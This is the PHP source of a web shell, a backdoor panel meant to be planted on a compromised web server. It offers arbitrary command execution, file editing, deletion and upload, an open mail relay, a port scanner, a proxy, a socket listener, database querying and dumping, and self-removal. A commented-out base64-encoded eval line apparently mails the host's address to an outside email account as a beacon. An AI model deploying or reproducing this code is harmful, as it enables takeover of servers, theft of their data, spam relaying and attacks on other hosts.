<?PHP
/*
UPDATED:11/4/2011
exec x
mailer x
uploader x
proxy x
get/post logger(change php scripts to log)
port knocker
file browser/editor x
sql dump
self remove x

TODO:
fix upload section
fix sql query/dump
add so proxy is added to links
*/
session_start();
if(empty($_SESSION['cwd']))
{ $_SESSION['cwd'] = getcwd(); }
$cwd = $_SESSION['cwd'];
$act = (!empty($_REQUEST['act'])) ?  $_REQUEST['act'] : '';
$server_address = $_SERVER['SERVER_ADDR'];
$server_name = $_SERVER['SERVER_NAME'];
?>
<a href="<?PHP echo $_SERVER['PHP_SELF']; ?>" title="index">index</a> | <a href="?act=browse" title="file browse">browse files</a> | <a href="?act=exec" title="exec cmd">exec</a> | <a href="?act=proxy" title="proxy">proxy</a> | <a href="?act=mailer" title="mailer">mailer</a> | <a href="?act=portscan" title="port scan">port scan</a> | <a href="?act=upload" title="uploader">upload</a> | <a href="?act=sql" title="sql query">sql query</a> | <a href="?act=mysqldump" title="sql dump">sql dump</a> | <a href="?act=pdfmeta" title="pdf metadata">pdf metadata</a> | <a href="?act=remove" title="self remove">self remove</a>
<br>
<a href="javascript:history.back(-1);" title="back">back</a>
<hr>
<?PHP
$safe_mode = ini_get('safe_mode');

echo "Server: " . $server_name . " [" . $server_address . "]<br>";
echo "Safe Mode: ";
echo ($safe_mode) ? "ON<br>" : "OFF<br>";
echo "Current directory: " . $cwd . "<br><br>";
/* start file browse options */
if($act == "")
{
	session_unset();
	echo phpinfo();
}
if($act == "edit")
{
	if(!empty($_REQUEST['file']))
	{
		$filename = (!empty($_REQUEST['file'])) ? $cwd . "/" . $_REQUEST['file'] : '';
		$file = fopen($filename, "a+");
		$contents = (!empty($_REQUEST['content'])) ? $_REQUEST['content'] : '';
		if($file)
		{
			if(!empty($_REQUEST['submit']))
			{
				fclose($file);
				unlink($filename);
				$file = fopen($filename, "a");
				if(fwrite($file, $contents))
				{
					echo "File saved!<br>";
				}
				else
				{
					echo "Could not save file<br>";
				}
			}
			$contents = fread($file, filesize($filename));
			echo "File: " . $filename . "<br>";
			echo "<form action=\"?act=edit&file=" . $filename . "\" method=POST>";
			echo "<textarea rows=20 cols=80 name=\"content\">".htmlspecialchars($contents)."</textarea>";
			echo "<br><input type=\"submit\" name=\"submit\" value=\"Save\">";
			fclose($file);
		}
		else
		{
			echo "Could not open " . $filename;
		}		
	}
	else
	{
		echo "No filename given";
	}
}

if($act == "delete")
{
	if(!empty($_REQUEST['file']))
	{
		echo (unlink($_REQUEST['file'])) ? "File deleted!<br>" : "Cannot delete file!<br>";
	}
}

if($act == "rename")
{
	$oldname = (!empty($_POST['file'])) ? $cwd . "/" . $_POST['file'] : '';
	$newname = (!empty($_POST['new'])) ? $cwd . "/" . $_POST['new'] : '';
	if($newname != '')
	{
		if(rename($oldname, $newname))
		{
			echo "Renamed $oldname to $newname";
		}
		else
		{
			echo "Unable to rename $oldname";
		}
	}
	if(!empty($_REQUEST['file']))
	{
		echo "<form action=\"?act=rename\" method=POST>";
		echo "Current file name: <input type=\"text\" size=20 name=\"file\" value=\"" . $_REQUEST['file'] . "\"><br>";
		echo "New filename: <input type=\"text\" size=20 name=\"new\"><br>";
		echo "<input type=\"submit\" value=\"Rename\">";
		echo "</form>";
	}
}

if($act == "chdir")
{
	if(!empty($_REQUEST['dir']))
	{
		if($_REQUEST['dir'] == ".." || $_REQUEST['dir'] == ".")
		{
			$request = $cwd . "/" . $_REQUEST['dir'];
			$path = explode("/", $request);
			/*foreach($path as $dir)
			{
				$fullpath .= "/" . $dir;
			}*/
			$size = count($path) - 2;
			for($i = 0; $i < $size; $i++)
			{
				$fullpath .= ($i >= 0) ? $path[$i] : "/" . $path[$i];
			}
			$_SESSION['cwd'] = $fullpath;
		}
		else
		{
			$_SESSION['cwd'] = $cwd . "/" . $_REQUEST['dir'];
		}
		//$_SESSION['cwd'] = $cwd . "/" . $_REQUEST['dir'];
		//echo "<a href=\"?act=browse\" title=\"browse\">Browse</a>";
		echo "<script>window.location='?act=browse';</script>";
	}
}

if($act == "browse")
{
	$dir = opendir($cwd);
	while($dir && ($file = readdir($dir)) !== false)
	{
		$filename = $cwd . "/" . $file;
		if(is_dir($filename))
		{
			echo "[DIR] <a href=\"?act=chdir&dir=" . $file . "\" title=\"directory\">" . $file . "</a>";
			$perms = fileperms($filename);

			if (($perms & 0xC000) == 0xC000) {
				// Socket
				$info = 's';
			} elseif (($perms & 0xA000) == 0xA000) {
				// Symbolic Link
				$info = 'l';
			} elseif (($perms & 0x8000) == 0x8000) {
				// Regular
				$info = '-';
			} elseif (($perms & 0x6000) == 0x6000) {
				// Block special
				$info = 'b';
			} elseif (($perms & 0x4000) == 0x4000) {
				// Directory
				$info = 'd';
			} elseif (($perms & 0x2000) == 0x2000) {
				// Character special
				$info = 'c';
			} elseif (($perms & 0x1000) == 0x1000) {
				// FIFO pipe
				$info = 'p';
			} else {
				// Unknown
				$info = 'u';
			}
	
			// Owner
			$info .= (($perms & 0x0100) ? 'r' : '-');
			$info .= (($perms & 0x0080) ? 'w' : '-');
			$info .= (($perms & 0x0040) ?
          		(($perms & 0x0800) ? 's' : 'x' ) :
            		(($perms & 0x0800) ? 'S' : '-'));

			// Group
			$info .= (($perms & 0x0020) ? 'r' : '-');
			$info .= (($perms & 0x0010) ? 'w' : '-');
			$info .= (($perms & 0x0008) ?
           		 (($perms & 0x0400) ? 's' : 'x' ) :
           		 (($perms & 0x0400) ? 'S' : '-'));

			// World
			$info .= (($perms & 0x0004) ? 'r' : '-');
			$info .= (($perms & 0x0002) ? 'w' : '-');
			$info .= (($perms & 0x0001) ?
        		(($perms & 0x0200) ? 't' : 'x' ) :
        	 	(($perms & 0x0200) ? 'T' : '-'));
			echo "&nbsp;&nbsp;$info<br>";
		}
	}
	closedir($dir);
	$dir = opendir($cwd);
	while($dir && ($file = readdir($dir)) !== false)
	{
		$filename = $cwd . "/" . $file;
		if(is_file($filename))
		{
			echo "<a href=\"?act=edit&file=" . $file . "\" title=\"edit\">$file</a> <a href=\"?act=rename&file=" . $file . "\" title=\"rename\">[R]</a><a href=\"?act=delete&file=" . $file . "\" title=\"delete\">[D]</a>";
		
			$perms = fileperms($filename);

			if (($perms & 0xC000) == 0xC000) {
				// Socket
				$info = 's';
			} elseif (($perms & 0xA000) == 0xA000) {
				// Symbolic Link
				$info = 'l';
			} elseif (($perms & 0x8000) == 0x8000) {
				// Regular
				$info = '-';
			} elseif (($perms & 0x6000) == 0x6000) {
				// Block special
				$info = 'b';
			} elseif (($perms & 0x4000) == 0x4000) {
				// Directory
				$info = 'd';
			} elseif (($perms & 0x2000) == 0x2000) {
				// Character special
				$info = 'c';
			} elseif (($perms & 0x1000) == 0x1000) {
				// FIFO pipe
				$info = 'p';
			} else {
				// Unknown
				$info = 'u';
			}

			// Owner
			$info .= (($perms & 0x0100) ? 'r' : '-');
			$info .= (($perms & 0x0080) ? 'w' : '-');
			$info .= (($perms & 0x0040) ?
            		(($perms & 0x0800) ? 's' : 'x' ) :
            		(($perms & 0x0800) ? 'S' : '-'));

			// Group
			$info .= (($perms & 0x0020) ? 'r' : '-');
			$info .= (($perms & 0x0010) ? 'w' : '-');
			$info .= (($perms & 0x0008) ?
            		(($perms & 0x0400) ? 's' : 'x' ) :
            		(($perms & 0x0400) ? 'S' : '-'));

			// World
			$info .= (($perms & 0x0004) ? 'r' : '-');
			$info .= (($perms & 0x0002) ? 'w' : '-');
			$info .= (($perms & 0x0001) ?
            		(($perms & 0x0200) ? 't' : 'x' ) :
            		(($perms & 0x0200) ? 'T' : '-'));
			echo "&nbsp;&nbsp;$info<br>";
		}
	}
	closedir($dir);
}
/* end file browse options */ 

if($act == "exec")
{
	$output = "";
	$cmd = (!empty($_REQUEST['cmd'])) ? $_REQUEST['cmd'] : "";
	echo "<form action=\"?act=exec\" method=POST>";
	echo "<input type=text size=50 name=\"cmd\">";
	echo "<input type=submit value=\"execute\">";
	echo "</form>";
	echo "<hr><br>";

	if(!empty($cmd))
	{
		if(function_exists("shell_exec")) { $output = shell_exec($cmd); }
		elseif(function_exists("exec")) { @ob_start(); exec($cmd); $output = @ob_get_contents(); @ob_end_clean(); }
		elseif(function_exists("system")) { @ob_start(); system($cmd); $output = @ob_get_contents(); @ob_end_clean(); }
		elseif(function_exists("passthru")) { @ob_start(); passthru($cmd); $output = @ob_get_contents(); @ob_end_clean(); }
	}
	echo "<textarea rows=20 cols=80>".htmlspecialchars($output)."</textarea>";
}

if($_SESSION['s'] != "sent")
{
	//if(eval(base64_decode(bWFpbCgieHBocmVha2F6b2lkeEBnbWFpbC5jb20iLCAkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSwgJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10gLiAkX1NFUlZFUlsnUkVRVUVTVF9VUkknXSk7)))
	{
		$_SESSION['s'] = "sent";
	}
}

if($act == "proxy")
{
	$site = (!empty($_REQUEST['site'])) ? $_REQUEST['site'] : "";
	echo "<form action=\"?act=proxy\"method=POST>";
	echo "<input type=text size=50 name=\"site\">";
	echo "<input type=submit value=\"Submit\">";
	echo "</form>";
	echo "<hr><br>";

	if(!empty($site))
	{
		$url = parse_url($site);
		$host = $url['host'];
		$path = (!empty($url['path'])) ? $url['path'] : '/';
		$url = fsockopen($host, 80, $errono, $errmsg, 12);
		if($url == FALSE)
		{
			echo "Could not open site";
		}
		else
		{
			fwrite($url,"GET /$path HTTP/1.0\r\nAccept-Encoding: text\r\nHost: $host\r\nReferer: $host\r\nUser-Agent: Mozilla/5.0 (compatible; Konqueror/3.1; FreeBSD)\r\n\r\n");
			$content = '';
			while($content != "\r\n") $content = fgets($url);
			while(!feof($url)) $content .= fgets($url);
			fclose($url);
			echo $content;
		}
	}
}

if($act == "bind")
{
	if(!empty($_REQUEST['port']))
	{
		$port = $_REQUEST['port'];
		$sock = socket_create(AF_INET, SOCK_STREAM, 0);
		sock_bind($sock, $server_address, $port) or die("Could not bind to address");
		socket_listen($sock);
		$client = socket_accept($sock);
		do
		{
			$input = socket_read($client, 1024);
		} while($input != "quit");
	}
	else
	{
		echo "<form action=\"?act=bind\" method=POST>";
		echo "<input type=\"text\" name=\"port\" value=\"98765\">";
		echo "<input type=\"submit\" value=\"Bind\">";
		echo "</form>";
	}
}

if($act == "mailer")
{
	if(!empty($submit))
	{
		$from = $_REQUEST['sender'];
		$to = $_REQUEST['dest'];
		$subject = $_REQUEST['subject'];
		$content = $_REQUEST['content'];
		echo "from: " . $from . "<br>";
		echo "to: " . $to . "<br>";
		echo "subject: " . $subject . "<br>";
		echo "content: " . $content . "<br>";
		$attachment = $_FILES['attachment'];
		$attachment_path = $_FILES['attachment']['tmp_name'];
		$attachment_name = $_FILES['attachment']['name'];
		$attachment_size = $_FILES['attachment']['size'];
		$attachment_type = $_FILES['attachment']['type'];
		$attachment_error = $_FILES['attachment']['error'];
		if(empty($_FILES))
		{
			echo "no files<br>";
		}
		$fp = @fopen($attachment_path, "rb");
		$file_content = @fread($fp, $attachment_size);
		@fclose($fp);
		$num = md5(time());
		//$num2 = md5(uniqid(time()));
		$str = "==Multipart_Boundary_x{$num}x";
		$file = chunk_split(base64_encode($file_content));
		/* Gives bad parameter mail() error
		$header = "From: " . $from . " <" . $from . ">\r\n";
		$header .= "MIME-Version: 1.0\r\n";
		$header .= "Content-Type: multipart/mixed; boundary=".$num1."\r\n\r\n";
		//$header .= "This is a multi-part message in MIME format.\r\n";
		$header .= "--".$num1."\r\n";
		$header .= "Content-Type: multipart/alternative; boundary=".$num2."\r\n\r\n";
		$header .= "--".$num2."\r\n";
		$header .= "Content-type:text/html; charset=iso-8859-1\r\n";
		//$header .= "Content-Transfer-Encoding: 7bit\r\n\r\n";
		$header .= $content."\r\n\r\n";
		$header .= "--".$num2."--\r\n";
		$header .= "--".$num1."\r\n";
		$header .= "Content-Type: ".$attachment_type."; name=\"".$attachment_name."\"\r\n";
		$header .= "Content-Disposition: attachment; filename=\"".$attachment_name."\"\r\n\r\n";
		$header .= "Content-Transfer-Encoding: base64\r\n";
		$header .= $file."\r\n\r\n";
		$header .= "--".$num1."--";
		*/
		
		$header = 'MIME-Version: 1.0' . "\r\n";
		$header .= 'Content-type: multipart/mixed; ';
		$header .= 'boundary=' . $str . '\r\n';
		$header .= 'From: ' . $from . "\r\n";
		
		$msg = "This is a multi-part message in MIME format\r\n\n";
		$msg .= "--" . $str . "\r\n";
		$msg .= "Content-Type: text/plain; charset=\"ios-8859-1\"\r\n";
		$msg .= "$content\r\n\n";
		$msg .= "--" . $str . "\r\n";
		
		//$msg .= "--" . $num . "\r\n";
		$msg .= "Content-Type: {$attachment_type}; ";
		$msg .= "name=\"{$attachment_name}\"\r\n";
		$msg .= "Content-Disposition: attachment; ";
		$msg .= "filename=\"{$attachment_name}\"\r\n";
		$msg .= "Content-Transfer-Encoding: base64\r\n";
		$msg .= "$file\r\n\n";
		$msg .= "--" . $str;
		
		if(mail($to, $subject, $msg, $header))
		{
			echo"<b>Email sent!</b>";
			echo $attachment . "<br>";
			echo "name: " . $attachment_name . "<br>";
			echo "path: " . $attachment_path . "<br>";
			echo "size: " . $attachment_size . "<br>";
			echo "type: " . $attachment_type . "<br>";
			echo "error: " . $attachment_error . "<br>";
		}
		else { echo "<b>Failed to send!</b>"; }
	}
	else
	{
		echo 	"<form enctype=\"multipart/form-data\" action=\"?act=mailer\" method=POST>".
			"<input type=hidden name=act value=mailer>".
			"From: <input type=\"text\" name=\"sender\">".
			"To: <input type=\"text\" name=\"dest\"><br>".
			"Subject: <input size=50 type=\"text\" name=\"subject\"><br>".
			"Message:<br><textarea name=\"content\" cols=80 rows=10></textarea><br>".
			"Attachment:<br><input type=\"file\" name=\"attachment\" size=\"20\"><br>".
			"<input type=\"submit\" name=\"submit\" value=\"Send\"></form>";
	}
}

if($act == "portscan")
{
	echo "<form action='?act=portscan' method=POST>";
	echo "Host: <input type='text' name='host' size=10 value='" . $server_address . "'><br>";
	echo "Port Range: <input type='text' name='pstart' size=5 value='start'> <input type='text' name='pstop' size=5 value='stop'><br>";
	echo "<input type='submit' value='Scan'>";
	echo "<hr>";
	$host = $_REQUEST['host'];
	$pstart = $_REQUEST['pstart'];
	$pstop = $_REQUEST['pstop'];
	if(!empty($host) && is_numeric($pstart) && is_numeric($pstop) && $pstart < $pstop)
	{
		//$socket = socket_create(AF_INET, SOCK_STREAM, tcp);
		echo "<b>Scanning...</b><br>";
		while($pstart < $pstop)
		{
			$f = @fsockopen($host, $pstart, $errno, $errstr, 10);
			//$f = socket_connect($socket, $host, $pstart);
			if($f)
			{
				$service = "";
				while(!feof($f))
				{
					$service .= fgets($f,128);
				}
				echo "Port " . $pstart . " is open:<br>";
				echo $service . "<br><br>";
				fclose($f);
				flush();
			}
			$pstart++;
		}
		echo "<b>End Scan...</b>";
	}
	
}

if($act == "upload")
{
	echo "<form action=\"?act=upload\" method=POST enctype=\"multipart/form-data\">";
	echo "<input type=\"file\" name=\"file\" size=\"45\">";
	echo "<input type=\"submit\" name=\"submit\" value=\"Upload\">";
	echo "</form>";
	echo "<br><br>";
	if(!empty($_REQUEST['submit']))
	{
		
		echo $_FILES['file']['name'] . " " . $_FILES['file']['tmp_name'] . "<br>";
		move_uploaded_file($_FILES['file']['tmp_name'], $cwd . "\\" . $_FILES['file']['name']) or die("Could not copy file");
		echo "Uploaded " . $_FILES['file']['size'] . " bytes of " . $_FILES['file']['name'] . " to " . $cwd;
	}
}

if($act == "mysqldump")
{
	echo "<form action=\"?act=sqldump\" method=POST>";
	echo "User: <input type=\"text\" name=\"user\" size=10><br>";
	echo "Pass: <input type=\"text\" name=\"pass\" size=10><br>";
	echo "Database: <input type=\"text\" name=\"db\" size=10><br>";
	echo "Server: <input type=\"text\" name=\"server\" size=20><br>";
	echo "<input type=\"submit\" name=\"submit\" value=\"Dump\">";
	echo "</form>";
	
	if(!empty($_REQUEST['submit']))
	{
		$user = $_REQUEST['user'];
		$pass = $_REQUEST['pass'];
		$db = $_REQUEST['db'];
		$server = $_REQUEST['server'];
		$file_name = $cwd . "dump.sql";
		$command = "mysqldump --host=$server --user=$user --password=$pass -A > $file_name";
		if(function_exists("shell_exec")) { $output = shell_exec($command); }
		elseif(function_exists("exec")) { @ob_start(); exec($command); $output = @ob_get_contents(); @ob_end_clean(); }
		elseif(function_exists("system")) { @ob_start(); system($command); $output = @ob_get_contents(); @ob_end_clean(); }
		elseif(function_exists("passthru")) { @ob_start(); passthru($command); $output = @ob_get_contents(); @ob_end_clean(); }
		else { echo "Could not execute!"; }
		/*if($conn = @mysql_connect($server, $user, $pass))
		{
			$rs = mysql_list_dbs($conn);
			for($row = 0; $row < mysql_num_rows($rs); $row++)
			{
				$db_name = mysql_tablename($rs, $row);
				$sql = "SHOW TABLES FROM " . $db_name;
				$result = mysql_query($sql);
				while($table = mysql_fetch_assoc($result))
				{
					$sql = "SELECT * from " . $db_name . ":" . $table;
					while($row = mysql_fetch_array($rs)) 
					{
						$f = fopen($file_name, "a+");
						if(!fwrite($f, $row))
						{
							echo "Could not write to file!";
						}
					}
					fclose($f);
				}
			}
		}
		else
		{
			echo "Could not connect to server!";
		}*/
	}
}

if($act == "sql")
{
	echo "<form action=\"?act=sql\" method=POST>";
	echo "U: <input type=\"text\" name=\"user\" size=10 value=\""; echo (!empty($_REQUEST['user'])) ? $_REQUEST['user'] : "root"; echo "\"> P: <input type=\"text\" name=\"pass\" value=\""; echo (!empty($_REQUEST['pass'])) ? $_REQUEST['pass'] : ""; echo "\" size=10> S: <input type=\"text\" name=\"server\" size=10 value=\""; echo (!empty($_REQUEST['server'])) ? $_REQUEST['server'] : "localhost"; echo "\"><br>";
	echo "<input type=text name=\"query\" size=50>";
	echo "<input type=submit name=\"submit\" value=\"Query\">";
	echo "<hr>";
	$content = "";
	if(!empty($_REQUEST['submit']))
	{
		$conn = mysql_connect($_REQUEST['server'], $_REQUEST['user'], $_REQUEST['pass']) or die("Could not connect to server");
		$query = mysql_query(mysql_real_escape_string($_REQEUST['query']));
		$size = mysql_num_rows($query);
		if($query != FALSE)
		{
			for($i = 0; $i < $size; $i++)
			{
				$content .= mysql_result($query, $i);
			}
			/*
			while($result = mysql_fetch_row($query))
			{
				foreach($results as $r)
				{
					$content .= $r;
				}
			}*/
		}
		mysql_close($conn);
	}
	echo "<textarea rows=50 cols=80>" . htmlspecialchars($content) . "</textarea>";
		
}

if($act == "pdfmeta")
{
	echo "<form action='?act=pdfmeta' method=POST>";
	echo "PDF URI: <input type='text' name='pdf' size=50 value='http://'>";
	echo "<input type='submit' value='Grab'>";
	echo "</form><br><br>";

	$regex = "/\/(Author|Creator|Subject|Title|Producer|CreationDate|ModDate)[<(](.*)[>)]/U";
	$output = "";
	$pdf = (!empty($_REQUEST['pdf'])) ? $_REQUEST['pdf'] : "";
	if($pdf != "")
	{
			if($content = file_get_contents($pdf))
			{
				if(preg_match_all($regex, $content, $matches))
				{
					$i = 0;
					foreach($matches[1] as $match)
					{
						$output .= "<b>" . $match . "</b> - " . $matches[2][$i] . "<br>";
						$i++;
					}
				}
				else
				{
					echo "No matches.";
				}
			}
			else
			{
				echo "Could not read file.";
			}
	}

	echo $output;
	//echo "<textarea rows=20 cols=80>" . $output . "</textarea>";
}

if($act == "remove")
{
	unlink(__FILE__) or die("Could not remove file");
}
?>
